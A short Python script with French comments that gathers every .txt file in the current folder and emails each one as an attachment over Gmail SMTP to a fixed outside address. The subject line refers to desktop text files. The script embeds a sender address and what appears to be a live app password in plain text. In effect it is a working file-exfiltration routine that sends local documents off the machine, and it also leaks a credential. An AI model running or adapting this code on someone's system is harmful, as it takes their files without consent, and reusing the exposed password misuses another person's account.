import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import os

# Email configuration
sender_email = "mattistjn@gmail.com"
sender_password = "vfci lgdm qeyu rbpj"
receiver_email = "mattistajan@gmail.com"
subject = "TXT DESKTOP"
body = "voici les txts du bureau"

dossier = "./"

# Liste tous les fichiers dans le dossier
fichiers = os.listdir(dossier)

# Filtrer les fichiers avec l'extension .txt
fichiers_txt = [fichier for fichier in fichiers if fichier.endswith(".txt")]
# File to be attached
# Afficher les noms des fichiers .txt
for fichier_txt in fichiers_txt:

    file_path = fichier_txt

    # Create the email message
    message = MIMEMultipart()
    message['From'] = sender_email
    message['To'] = receiver_email
    message['Subject'] = subject
    message.attach(MIMEText(body, 'plain'))

    # Attach the file
    with open(file_path, 'rb') as attachment:
        part = MIMEBase('application', 'octet-stream')
        part.set_payload(attachment.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', f"attachment; filename= {file_path}")
        message.attach(part)

    # Connect to the SMTP server
    with smtplib.SMTP('smtp.gmail.com', 587) as server:
        server.starttls()
        # Login to the email account
        server.login(sender_email, sender_password)
        # Send the email
        server.sendmail(sender_email, receiver_email, message.as_string())

    print("Email sent successfully.")